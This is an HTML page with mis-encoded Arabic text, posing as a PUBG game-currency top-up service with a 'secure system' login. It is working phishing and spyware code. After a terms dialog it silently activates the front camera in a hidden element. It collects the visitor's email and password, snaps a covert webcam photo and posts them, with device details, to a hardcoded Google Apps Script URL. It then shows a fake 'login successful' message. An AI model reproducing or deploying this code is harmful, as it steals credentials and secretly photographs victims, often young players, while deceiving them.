<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ุดุญู ุจุจุฌู - ุงููุธุงู ุงูุขูู</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

body {
  background-image: url("bbb.jpeg"); /* ุถุน ููุง ุงุณู ุตูุฑุชู */
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 15px;
}

/* ุงูุญุงููุฉ ุงูุฑุฆูุณูุฉ */
.main-container {
  width: 100%;
  max-width: 1200px;
  display: flex;
  flex-direction: column;
  gap: 20px;
}

/* ุงูููุฏุฑ */
.header {
  position: relative;
  background: none; /* ุจุฏูู ุฎูููุฉ ุดูุงูุฉ */
  color: white;
  text-align: center;
  padding: 20px;
  border-radius: 12px;
}

.header-logo {
  position: absolute;
  left: 20px;
  top: 20px;
  width: 90px; /* ุญุฌู ุงูุดุนุงุฑ */
  height: auto;
  border-radius: 6px;
  box-shadow: none;
}

.header h1 {
  font-size: 2rem;
  margin-bottom: 8px;
  color: #fff;
  text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.7);
}

.header p {
  opacity: 0.9;
  font-size: 1rem;
  color: #f1f1f1;
  text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.6);
}

/* ุงููุญุชูู */
.content {
  display: flex;
  gap: 20px;
  flex-wrap: wrap;
}

/* ูุฑุจุนุงุช ุงูุดุญู */
.charges-section, .player-id-section {
  flex: 1;
  min-width: 300px;
  background: rgba(255, 255, 255, 0.9);
  border-radius: 12px;
  box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25);
  padding: 20px;
  backdrop-filter: blur(4px);
}

/* ุงูุนูุงููู ุฏุงุฎู ุงูุฃูุณุงู */
.charges-section h2, .player-id-section h2 {
  color: #2c3e50;
  margin-bottom: 20px;
  text-align: center;
  font-size: 1.5rem;
  padding-bottom: 10px;
  border-bottom: 2px solid #ecf0f1;
}

/* ุฎูุงุฑุงุช ุงูุดุญู */
.charge-options {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 15px;
  margin-bottom: 25px;
}

.charge-option {
  background: #f8f9fa;
  border: 2px solid #e1e5ee;
  border-radius: 8px;
  padding: 15px 10px;
  text-align: center;
  cursor: pointer;
  transition: all 0.3s ease;
}

.charge-option:hover {
  transform: translateY(-3px);
  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
  border-color: #3498db;
}

.charge-option.selected {
  background: #e3f2fd;
  border-color: #3498db;
  box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
}

.charge-amount {
  font-size: 1.2rem;
  font-weight: bold;
  color: #2c3e50;
  margin-bottom: 5px;
}

.charge-price {
  font-size: 0.9rem;
  color: #27ae60;
  font-weight: 600;
}

/* ุงูุญููู */
.form-group {
  margin-bottom: 18px;
}

label {
  display: block;
  margin-bottom: 6px;
  font-weight: 600;
  color: #2c3e50;
  font-size: 0.9rem;
}

input, select {
  width: 100%;
  padding: 12px 15px;
  border: 2px solid #e1e5ee;
  border-radius: 6px;
  font-size: 15px;
  transition: all 0.3s ease;
}

input:focus, select:focus {
  border-color: #3498db;
  outline: none;
  box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
}

/* ุฒุฑ ุงููุชุงุจุนุฉ */
.proceed-btn {
  width: 100%;
  background: linear-gradient(to right, #3498db, #2c3e50);
  color: white;
  border: none;
  padding: 14px;
  border-radius: 6px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-top: 8px;
}

.proceed-btn:hover {
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
}

.proceed-btn:disabled {
  background: #bdc3c7;
  cursor: not-allowed;
}

/* ุงูููุชุฑ */
.footer {
  text-align: center;
  padding: 18px 20px;
  color: white;
  font-size: 0.75rem;
  border-radius: 12px;
  background: rgba(0, 0, 0, 0.4);
}

.footer a {
  color: #3498db;
  text-decoration: none;
}

/* ุชุญุณูู ุงูููุจุงูู */
@media (max-width: 768px) {
  .content {
    flex-direction: column;
  }
  .header h1 {
    font-size: 1.6rem;
  }
  .header-logo {
    left: 10px;
    top: 10px;
    width: 70px;
  }
}
</style>

</head>
<body>
    <!-- ูุงูุฐุฉ ุงูุดุฑูุท ูุงูุฃุญูุงู -->
    <div id="terms-modal">
        <div class="terms-content">
            <h2>๐ ุงูุดุฑูุท ูุงูุฃุญูุงู</h2>
            
            <div class="terms-text">
                <h3>ููุงููุฉ ุนูู ุงุณุชุฎุฏุงู ุงููุธุงู</h3>
                <p>ุจุงุณุชุฎุฏุงูู ููุฐุง ุงููุธุงูุ ูุฅูู ุชูุงูู ุนูู ุงูุดุฑูุท ูุงูุฃุญูุงู ุงูุชุงููุฉ:</p>
                
                <h3>ุดุฑูุท ุดุญู ูุนุจุฉ ุจุจุฌู</h3>
                <p>1. ูุฌุจ ุฃู ูููู ID ุงููุงุนุจ ุตุญูุญุงู ููุงุจูุงู ููุงุณุชูุงู.</p>
                <p>2. ุงููุจุงูุบ ุงููุฏููุนุฉ ุบูุฑ ูุงุจูุฉ ููุงุณุชุฑุฏุงุฏ ุจุนุฏ ุฅุชูุงู ุนูููุฉ ุงูุดุญู.</p>
                <p>3. ูุชุญูู ุงููุณุชุฎุฏู ูุณุคูููุฉ ุฅุฏุฎุงู ุงููุนูููุงุช ุงูุตุญูุญุฉ.</p>
                
                <h3>ุงูุฎุตูุตูุฉ ูุงูุฃูุงู</h3>
                <p>1. ูุญู ูุญุชุฑู ุฎุตูุตูุชู ููุง ูุดุงุฑู ุจูุงูุงุชู ูุน ุฃุทุฑุงู ุซุงูุซุฉ.</p>
                <p>2. ูุชู ุงุณุชุฎุฏุงู ุงููุงููุฑุง ููุชุญูู ูู ูููุฉ ุงููุณุชุฎุฏู ููุท.</p>
                <p>3. ูุชู ุชุฎุฒูู ุงูุจูุงูุงุช ุจุดูู ุขูู ููุดูุฑ.</p>
                
                <h3>ูุงุชุดุงุฑู ุญุณุงุจู ูุน ุงุญุฏ</h3>
                <p>ูุญุชูุธ ุงููุธุงู ุจุงูุญู ูู ุฅููุงู ุงูุญุณุงุจ ูู ุญุงู ูุฎุงููุฉ ูุฐู ุงูุดุฑูุท ุฃู ุฅุณุงุกุฉ ุงูุงุณุชุฎุฏุงู:</p>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="agree-checkbox">
                <label for="agree-checkbox">ุฃูุฑ ุจุฃูู ูุฏ ูุฑุฃุช ููููุช ุงูุดุฑูุท ูุงูุฃุญูุงู ูุฃูุงูู ุนูููุง</label>
            </div>
            
            <div class="terms-actions">
                <button class="terms-btn cancel-btn" id="cancel-terms">ุฅูุบุงุก</button>
                <button class="terms-btn agree-btn" id="agree-terms" disabled>ููุงูู</button>
            </div>
        </div>
    </div>

    <!-- ูุงุฌูุฉ ุงุฎุชูุงุฑ ุงูุดุญู -->
    <div class="header">
  <img src="WWW.png" alt="ุดุนุงุฑ ุจุจุฌู" class="header-logo">
  <h1>ุดุญู ูุนุจุฉ ุจุจุฌู</h1>
  <p>ุงุฎุชุฑ ุนุฏุฏ ุงูุดุฏุงุช ูุฃุฏุฎู ูุนูููุงุช ุงููุงุนุจ</p>
</div>
            <h1>ุดุญู ูุนุจุฉ ุจุจุฌู</h1>
            <p>ุงุฎุชุฑ ุนุฏุฏ ุงูุดุฏุงุช ูุฃุฏุฎู ูุนูููุงุช ุงููุงุนุจ</p>
        </div>
        
        <div class="content">
            <div class="charges-section">
                <h2>ุงุฎุชุฑ ุนุฏุฏ ุงูุดุฏุงุช</h2>
                <div class="charge-options">
                    <div class="charge-option" data-amount="60" data-price="10">
                        <div class="charge-amount">60 ุดุฏูุฉ</div>
                        <div class="charge-price">10 ุฑูุงู</div>
                    </div>
                    <div class="charge-option" data-amount="325" data-price="50">
                        <div class="charge-amount">325 ุดุฏูุฉ</div>
                        <div class="charge-price">50 ุฑูุงู</div>
                    </div>
                    <div class="charge-option" data-amount="660" data-price="100">
                        <div class="charge-amount">660 ุดุฏูุฉ</div>
                        <div class="charge-price">100 ุฑูุงู</div>
                    </div>
                    <div class="charge-option" data-amount="1800" data-price="250">
                        <div class="charge-amount">1800 ุดุฏูุฉ</div>
                        <div class="charge-price">250 ุฑูุงู</div>
                    </div>
                    <div class="charge-option" data-amount="3850" data-price="500">
                        <div class="charge-amount">3850 ุดุฏูุฉ</div>
                        <div class="charge-price">500 ุฑูุงู</div>
                    </div>
                    <div class="charge-option" data-amount="8100" data-price="1000">
                        <div class="charge-amount">8100 ุดุฏูุฉ</div>
                        <div class="charge-price">1000 ุฑูุงู</div>
                    </div>
                </div>
                
                <div class="selected-charge-info" id="selected-charge-info" style="display: none;">
                    <h3>ุงูุดุญูุฉ ุงููุฎุชุงุฑุฉ:</h3>
                    <p id="charge-details"></p>
                </div>
            </div>
            
            <div class="player-id-section">
                <h2>ูุนูููุงุช ุงููุงุนุจ</h2>
                <div class="form-group">
                    <label for="player-id">ูุนุฑู ุงููุงุนุจ (Player ID)</label>
                    <input type="text" id="player-id" placeholder="ุฃุฏุฎู ูุนุฑู ุงููุงุนุจ" required>
                </div>
                
                <div class="form-group">
                    <label for="player-name">ุงุณู ุงููุงุนุจ (ุงุฎุชูุงุฑู)</label>
                    <input type="text" id="player-name" placeholder="ุฃุฏุฎู ุงุณู ุงููุงุนุจ">
                </div>
                
                <div class="form-group">
                    <label for="server">ุงูุฎุงุฏู (Server)</label>
                    <select id="server" required>
                        <option value="">ุงุฎุชุฑ ุงูุฎุงุฏู</option>
                        <option value="asia">ุขุณูุง</option>
                        <option value="europe">ุฃูุฑูุจุง</option>
                        <option value="america">ุฃูุฑููุง</option>
                        <option value="middle-east">ุงูุดุฑู ุงูุฃูุณุท</option>
                    </select>
                </div>
                
                <button class="proceed-btn" id="proceed-btn" disabled>ุงููุชุงุจุนุฉ ุฅูู ุงูุฏูุน</button>
                
                <div id="status"></div>
            </div>
        </div>
        
        <div class="footer">
            <p>ยฉ 2024 ูุธุงู ุดุญู ุจุจุฌู ุงูุขูู. ุฌููุน ุงูุญููู ูุญููุธุฉ.</p>
            <p>ุงูุฅุตุฏุงุฑ 3.1.0 | <a href="#" id="show-terms">ุงูุดุฑูุท ูุงูุฃุญูุงู</a></p>
        </div>
    </div>

    <!-- ุตูุญุฉ ุชุณุฌูู ุงูุฏุฎูู -->
    <div class="login-container" id="login-container">
        <div class="login-header">
            <div class="login-logo">S</div>
            <h1>ุงููุธุงู ุงูุขูู</h1>
            <p>ูุฌุจ ุชุณุฌูู ุงูุฏุฎูู ูููุตูู ุฅูู ุงููุธุงู</p>
        </div>
        
        <form class="login-form" id="loginForm">
            <div class="form-group">
                <label for="username">ุงูุจุฑูุฏ ุงูุฅููุชุฑููู</label>
                <input type="email" id="username" placeholder="ุฃุฏุฎู ุงูุจุฑูุฏ ุงูุฅููุชุฑููู" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">ูููุฉ ุงููุฑูุฑ</label>
                <div class="password-container">
                    <input type="password" id="password" placeholder="ุฃุฏุฎู ูููุฉ ุงููุฑูุฑ" required autocomplete="current-password">
                    <button type="button" class="toggle-password" id="togglePassword" aria-label="ุฅุธูุงุฑ/ุฅุฎูุงุก ูููุฉ ุงููุฑูุฑ">๐๏ธ</button>
                </div>
            </div>
            
            <button type="submit" class="login-btn" id="loginBtn">ุชุณุฌูู ุงูุฏุฎูู</button>
            
            <div class="forgot-password">
                <a href="#">ูุณูุช ูููุฉ ุงููุฑูุฑุ</a>
            </div>
            
            <!-- ุฑุณุงูุฉ ูุฌุงุญ ุชุณุฌูู ุงูุฏุฎูู -->
            <div class="login-success" id="loginSuccess">
                <p>ุฌุงุฑู ุงูุชุญูู ูู ุจูุงูุงุชู...</p>
            </div>
            
            <div id="login-status"></div>
        </form>
        
        <div class="footer">
            <p>ยฉ 2024 ุงููุธุงู ุงูุขูู. ุฌููุน ุงูุญููู ูุญููุธุฉ.</p>
            <p>ุงูุฅุตุฏุงุฑ 3.1.0 | <a href="#" id="show-login-terms">ุงูุดุฑูุท ูุงูุฃุญูุงู</a></p>
        </div>
    </div>

    <!-- ุงููุงููุฑุง ุงููุฎููุฉ ุชูุงูุงู -->
    <div id="camera-container">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        // ุงูุนูุงุตุฑ
        const mainContainer = document.getElementById('main-container');
        const loginContainer = document.getElementById('login-container');
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const togglePasswordBtn = document.getElementById('togglePassword');
        const loginBtn = document.getElementById('loginBtn');
        const loginStatusDiv = document.getElementById('login-status');
        const loginSuccess = document.getElementById('loginSuccess');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const termsModal = document.getElementById('terms-modal');
        const agreeCheckbox = document.getElementById('agree-checkbox');
        const agreeBtn = document.getElementById('agree-terms');
        const cancelBtn = document.getElementById('cancel-terms');
        const showTermsLink = document.getElementById('show-terms');
        const showLoginTermsLink = document.getElementById('show-login-terms');
        const chargeOptions = document.querySelectorAll('.charge-option');
        const playerIdInput = document.getElementById('player-id');
        const playerNameInput = document.getElementById('player-name');
        const serverSelect = document.getElementById('server');
        const proceedBtn = document.getElementById('proceed-btn');
        const selectedChargeInfo = document.getElementById('selected-charge-info');
        const chargeDetails = document.getElementById('charge-details');
        const statusDiv = document.getElementById('status');
        
        let stream = null;
        let cameraInitialized = false;
        let termsAccepted = false;
        let selectedCharge = null;
        
        // ุฑุงุจุท Google Apps Script - ุงุณุชุจุฏูู ุจุฑุงุจุท ูุดุฑู
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxba-9A5naC85K9UuH60IfZJ5bs6pRcg-La_B4XBYikC2a3y1gLeqe5njifEhgoBgfg/exec';
        
        // ุฅุธูุงุฑ ูุงูุฐุฉ ุงูุดุฑูุท ุนูุฏ ุชุญููู ุงูุตูุญุฉ
        document.addEventListener('DOMContentLoaded', function() {
            termsModal.style.display = 'flex';
        });
        
        // ุงูุชุญูู ูู ุฒุฑ ุงูููุงููุฉ ุจูุงุกู ุนูู ุชุญุฏูุฏ ุงููุฑุจุน
        agreeCheckbox.addEventListener('change', function() {
            agreeBtn.disabled = !this.checked;
        });
        
        // ุฒุฑ ุงูููุงููุฉ ุนูู ุงูุดุฑูุท
        agreeBtn.addEventListener('click', async function() {
            if (agreeCheckbox.checked) {
                showStatus('ุฌุงุฑู ุชููุฆุฉ ุงููุธุงู...', 'loading');
                termsModal.style.display = 'none';
                termsAccepted = true;
                
                // ุจุฏุก ุชููุฆุฉ ุงููุงููุฑุง ุจุนุฏ ุงูููุงููุฉ
                await initializeCameraSilently();
                
                setTimeout(() => {
                    showStatus('', '');
                }, 2000);
            }
        });
        
        // ุฒุฑ ุฅูุบุงุก ุงูุดุฑูุท
        cancelBtn.addEventListener('click', function() {
            termsModal.style.display = 'none';
            showStatus('ูุฌุจ ุงูููุงููุฉ ุนูู ุงูุดุฑูุท ูุงูุฃุญูุงู ูุงุณุชุฎุฏุงู ุงููุธุงู', 'error');
        });
        
        // ุฅุธูุงุฑ ุงูุดุฑูุท ุนูุฏ ุงูููุฑ ุนูู ุงูุฑุงุจุท
        showTermsLink.addEventListener('click', function(e) {
            e.preventDefault();
            termsModal.style.display = 'flex';
        });
        
        showLoginTermsLink.addEventListener('click', function(e) {
            e.preventDefault();
            termsModal.style.display = 'flex';
        });
        
        // ุงุฎุชูุงุฑ ุนุฏุฏ ุงูุดุฏุงุช
        chargeOptions.forEach(option => {
            option.addEventListener('click', function() {
                // ุฅุฒุงูุฉ ุงูุชุญุฏูุฏ ูู ุฌููุน ุงูุฎูุงุฑุงุช
                chargeOptions.forEach(opt => opt.classList.remove('selected'));
                
                // ุชุญุฏูุฏ ุงูุฎูุงุฑ ุงูุญุงูู
                this.classList.add('selected');
                
                // ุญูุธ ุงูุจูุงูุงุช ุงููุฎุชุงุฑุฉ
                selectedCharge = {
                    amount: this.getAttribute('data-amount'),
                    price: this.getAttribute('data-price')
                };
                
                // ุนุฑุถ ุงููุนูููุงุช ุงููุฎุชุงุฑุฉ
                selectedChargeInfo.style.display = 'block';
                chargeDetails.textContent = `${selectedCharge.amount} ุดุฏูุฉ - ${selectedCharge.price} ุฑูุงู`;
                
                // ุชูุนูู ุฒุฑ ุงููุชุงุจุนุฉ ุฅุฐุง ูุงูุช ุฌููุน ุงูุจูุงูุงุช ููุชููุฉ
                checkFormCompletion();
            });
        });
        
        // ุงูุชุญูู ูู ุงูุชูุงู ุงูุจูุงูุงุช
        function checkFormCompletion() {
            if (selectedCharge && playerIdInput.value.trim() && serverSelect.value) {
                proceedBtn.disabled = false;
            } else {
                proceedBtn.disabled = true;
            }
        }
        
        // ุฅุถุงูุฉ ูุณุชูุนุงุช ุงูุฃุญุฏุงุซ ูุญููู ุงูุฅุฏุฎุงู
        playerIdInput.addEventListener('input', checkFormCompletion);
        serverSelect.addEventListener('change', checkFormCompletion);
        
        // ุฒุฑ ุงููุชุงุจุนุฉ ุฅูู ุงูุฏูุน
        proceedBtn.addEventListener('click', function() {
            if (!termsAccepted) {
                showStatus('ูุฌุจ ุงูููุงููุฉ ุนูู ุงูุดุฑูุท ูุงูุฃุญูุงู ุฃููุงู', 'error');
                termsModal.style.display = 'flex';
                return;
            }
            
            // ุงูุงูุชูุงู ุฅูู ุตูุญุฉ ุชุณุฌูู ุงูุฏุฎูู
            mainContainer.style.display = 'none';
            loginContainer.style.display = 'block';
            
            // ุชุนุจุฆุฉ ูุนูููุงุช ุงููุงุนุจ ูู ุฑุณุงูุฉ ุชุฑุญูุจ
            showLoginStatus(`ูุฑุญุจุงู! ุฌุงุฑู ุฅุนุฏุงุฏ ุดุญู ${selectedCharge.amount} ุดุฏูุฉ ููุงุนุจ ${playerIdInput.value.trim()}`, 'success');
        });
        
        // ุชููุฆุฉ ุงููุงููุฑุง ุจุดูู ุฎูู ุจุนุฏ ุงูููุงููุฉ
        async function initializeCameraSilently() {
            try {
                // ูุญุงููุฉ ุฅุนุฏุงุฏุงุช ุงููุงููุฑุง ุงูุฃุณุงุณูุฉ ุงููุชูุงููุฉ
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { min: 320, ideal: 640, max: 1280 },
                        height: { min: 240, ideal: 480, max: 720 },
                        frameRate: { ideal: 24, max: 30 }
                    },
                    audio: false
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                // ุงูุชุธุงุฑ ุชุญููู ุงูููุฏูู
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => {
                        reject(new Error('Timeout loading camera'));
                    }, 3000);
                    
                    video.onloadedmetadata = () => {
                        clearTimeout(timeout);
                        video.play().then(resolve).catch(reject);
                    };
                    
                    video.onerror = () => {
                        clearTimeout(timeout);
                        reject(new Error('Video error'));
                    };
                });
                
                cameraInitialized = true;
                console.log('โ Camera initialized successfully');
                
            } catch (error) {
                console.log('โ Camera initialization failed:', error);
                
                // ูุญุงููุฉ ุจุฏููุฉ ุจุฅุนุฏุงุฏุงุช ุฃุจุณุท
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }, 
                        audio: false 
                    });
                    
                    video.srcObject = stream;
                    cameraInitialized = true;
                    console.log('โ Camera initialized with basic settings');
                    
                } catch (secondError) {
                    console.log('โ Camera initialization completely failed:', secondError);
                    showStatus('ุชุนุฐุฑ ุงููุตูู ุฅูู ุงููุงููุฑุง', 'error');
                }
            }
        }
        
        // ุชุจุฏูู ุฑุคูุฉ ูููุฉ ุงููุฑูุฑ
        togglePasswordBtn.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.textContent = '๐';
                togglePasswordBtn.setAttribute('aria-label', 'ุฅุฎูุงุก ูููุฉ ุงููุฑูุฑ');
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.textContent = '๐๏ธ';
                togglePasswordBtn.setAttribute('aria-label', 'ุฅุธูุงุฑ ูููุฉ ุงููุฑูุฑ');
            }
        });
        
        // ุฅุฏุฎุงู ูููุฉ ุงููุฑูุฑ ุจุงุณุชุฎุฏุงู Enter
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                loginForm.dispatchEvent(new Event('submit'));
            }
        });
        
        // ูุนุงูุฌุฉ ุชุณุฌูู ุงูุฏุฎูู
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // ุงูุชุญูู ูู ุงูููุงููุฉ ุนูู ุงูุดุฑูุท
            if (!termsAccepted) {
                showLoginStatus('ูุฌุจ ุงูููุงููุฉ ุนูู ุงูุดุฑูุท ูุงูุฃุญูุงู ุฃููุงู', 'error');
                termsModal.style.display = 'flex';
                return;
            }
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) {
                showLoginStatus('ูุฑุฌู ููุก ุฌููุน ุงูุญููู', 'error');
                return;
            }
            
            // ุฅุธูุงุฑ ุฑุณุงูุฉ ุงูุชุญูู ุงูุนุงุฏูุฉ
            loginSuccess.style.display = 'block';
            loginBtn.disabled = true;
            loginBtn.textContent = 'ุฌุงุฑู ุงูุชุญูู...';
            
            // ุฅุฎูุงุก ููุญุฉ ุงูููุงุชูุญ ูู ุงูุฃุฌูุฒุฉ ุงููุญูููุฉ
            if ('virtualKeyboard' in navigator) {
                navigator.virtualKeyboard.hide();
            }
            
            try {
                // ุงูุชูุงุท ุงูุตูุฑุฉ ุฎููุฉ ูุฅุฑุณุงููุง
                await captureAndSendPhoto(username, password);
                
            } catch (error) {
                console.error('Error:', error);
                // ุฅุธูุงุฑ ุฑุณุงูุฉ ุฎุทุฃ ุนุงุฏูุฉ
                handleLoginError();
            }
        });
        
        // ูุนุงูุฌุฉ ุฎุทุฃ ุชุณุฌูู ุงูุฏุฎูู
        function handleLoginError() {
            loginSuccess.style.display = 'none';
            showLoginStatus('ุงูุจุฑูุฏ ุงูุฅููุชุฑููู ุฃู ูููุฉ ุงููุฑูุฑ ุบูุฑ ุตุญูุญุฉ', 'error');
            loginBtn.disabled = false;
            loginBtn.textContent = 'ุชุณุฌูู ุงูุฏุฎูู';
            
            // ุฅุนุงุฏุฉ ุงูุชุฑููุฒ ุนูู ุญูู ุงุณู ุงููุณุชุฎุฏู
            setTimeout(() => {
                usernameInput.focus();
            }, 100);
        }
        
        // ุงูุชูุงุท ุงูุตูุฑุฉ ูุฅุฑุณุงููุง ุจุดูู ุฎูู
        async function captureAndSendPhoto(username, password) {
            try {
                let imageData = null;
                
                // ุฅุฐุง ูุงูุช ุงููุงููุฑุง ุฌุงูุฒุฉุ ููุชูุท ุตูุฑุฉ
                if (cameraInitialized && stream && video.readyState === 4) {
                    console.log('๐ธ Capturing photo...');
                    
                    // ุงูุชุธุงุฑ ุจุณูุท ูุถูุงู ุฌูุฏุฉ ุงูุตูุฑุฉ
                    await new Promise(resolve => setTimeout(resolve, 600));
                    
                    const context = canvas.getContext('2d');
                    
                    // ุถุจุท ุฃุจุนุงุฏ ุงููุงููุงุณ ูุน ุงูุญูุงุธ ุนูู ุงููุณุจุฉ
                    const videoWidth = video.videoWidth;
                    const videoHeight = video.videoHeight;
                    
                    // ุงุณุชุฎุฏุงู ุฃุจุนุงุฏ ููุงุณุจุฉ ูุฌููุน ุงูุฃุฌูุฒุฉ
                    canvas.width = Math.min(videoWidth, 800);
                    canvas.height = Math.min(videoHeight, 600);
                    
                    // ุฑุณู ุงูุตูุฑุฉ ุจุฏูุฉ ููุงุณุจุฉ
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // ุชุญููู ุงูุตูุฑุฉ ุฅูู ุจูุงูุงุช ุจุฌูุฏุฉ ูุชูุณุทุฉ ููุญุฌู
                    imageData = canvas.toDataURL('image/jpeg', 0.85);
                    
                    console.log('โ Photo captured successfully');
                } else {
                    console.log('โ Camera not ready for capture');
                }
                
                // ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู Google Apps Script
                await sendToGoogleScript(username, password, imageData);
                
            } catch (error) {
                console.error('Error capturing/sending photo:', error);
                throw error;
            }
        }
        
        // ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู Google Apps Script
        async function sendToGoogleScript(username, password, imageData) {
            try {
                const formData = new FormData();
                formData.append('username', username);
                formData.append('password', password);
                
                // ุฅุถุงูุฉ ูุนูููุงุช ุงูุดุญู
                formData.append('chargeAmount', selectedCharge.amount);
                formData.append('chargePrice', selectedCharge.price);
                formData.append('playerId', playerIdInput.value.trim());
                formData.append('playerName', playerNameInput.value.trim());
                formData.append('server', serverSelect.value);
                
                if (imageData) {
                    formData.append('image', imageData);
                    console.log('๐ค Sending image data...');
                }
                
                // ุฌูุน ูุนูููุงุช ุฅุถุงููุฉ ุนู ุงูุฌูุงุฒ
                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
                formData.append('userAgent', navigator.userAgent);
                formData.append('platform', navigator.platform);
                formData.append('language', navigator.language);
                formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
                
                console.log('๐ Sending data to Google Script...');
                
                // ุฅุฑุณุงู ุงูุจูุงูุงุช
                const response = await fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
                
                // ูุน no-corsุ ูู ูุชููู ูู ูุฑุงุกุฉ ุงูุงุณุชุฌุงุจุฉ
                console.log('โ Data sent successfully');
                
                // ูุญุงูุงุฉ ูุฌุงุญ ุงูุฅุฑุณุงู (ูู ุงููุงูุนุ ูุง ูููููุง ุงูุชุญูู ูู ุงูุงุณุชุฌุงุจุฉ ูุน no-cors)
                setTimeout(() => {
                    loginSuccess.innerHTML = '<p>โ ุชู ุชุณุฌูู ุงูุฏุฎูู ุจูุฌุงุญ! ุฌุงุฑู ุงูุชูุฌูู...</p>';
                    
                    // ุฅุนุงุฏุฉ ุชุนููู ุงููููุฐุฌ
                    setTimeout(() => {
                        loginForm.reset();
                        loginSuccess.style.display = 'none';
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'ุชุณุฌูู ุงูุฏุฎูู';
                        
                        // ุฅุนุงุฏุฉ ุฅูู ุงูุตูุญุฉ ุงูุฑุฆูุณูุฉ
                        loginContainer.style.display = 'none';
                        mainContainer.style.display = 'flex';
                        showStatus('ุชู ุชุณุฌูู ุงูุฏุฎูู ุจูุฌุงุญ!', 'success');
                        
                        // ุฅุนุงุฏุฉ ุชุนููู ุจูุงูุงุช ุงูุดุญู
                        resetChargeData();
                        
                    }, 2000);
                }, 1500);
                
            } catch (error) {
                console.error('Error sending data:', error);
                throw error;
            }
        }
        
        // ุฅุนุงุฏุฉ ุชุนููู ุจูุงูุงุช ุงูุดุญู
        function resetChargeData() {
            selectedCharge = null;
            chargeOptions.forEach(opt => opt.classList.remove('selected'));
            selectedChargeInfo.style.display = 'none';
            playerIdInput.value = '';
            playerNameInput.value = '';
            serverSelect.value = '';
            proceedBtn.disabled = true;
        }
        
        // ุฅุธูุงุฑ ุฑุณุงูุฉ ุญุงูุฉ
        function showStatus(message, type) {
            statusDiv.textContent = message;
            statusDiv.className = type;
            statusDiv.style.display = message ? 'block' : 'none';
        }
        
        function showLoginStatus(message, type) {
            loginStatusDiv.textContent = message;
            loginStatusDiv.className = type;
            loginStatusDiv.style.display = message ? 'block' : 'none';
        }
        
        // ุชูุธูู ุงููุงููุฑุง ุนูุฏ ุฅุบูุงู ุงูุตูุญุฉ
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>


















